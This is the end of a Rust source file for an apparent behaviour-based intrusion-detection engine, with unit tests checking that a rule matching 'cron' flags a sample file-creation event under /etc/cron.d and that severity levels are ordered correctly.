    let mut engine = BehaviorEngine::new(args);
    engine.run()
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_condition_equals() {
        let engine = BehaviorEngine::new(Args::parse_from(["test"]));
        let event = Event {
            id: "test".to_string(),
            timestamp: "2024-01-01 00:00:00".to_string(),
            event_type: EventType::FileCreate,
            pid: 1,
            process_name: "test".to_string(),
            ppid: 0,
            parent_name: "init".to_string(),
            cmdline: "test".to_string(),
            uid: 0,
            target: "/etc/cron.d/backdoor".to_string(),
            details: HashMap::new(),
        };

        let condition = RuleCondition {
            field: "target".to_string(),
            operator: "contains".to_string(),
            value: "cron".to_string(),
            negate: false,
        };

        assert!(engine.matches_condition(&event, &condition));
    }

    #[test]
    fn test_severity_ordering() {
        assert!(Severity::Critical > Severity::High);
        assert!(Severity::High > Severity::Medium);
        assert!(Severity::Medium > Severity::Low);
    }
}
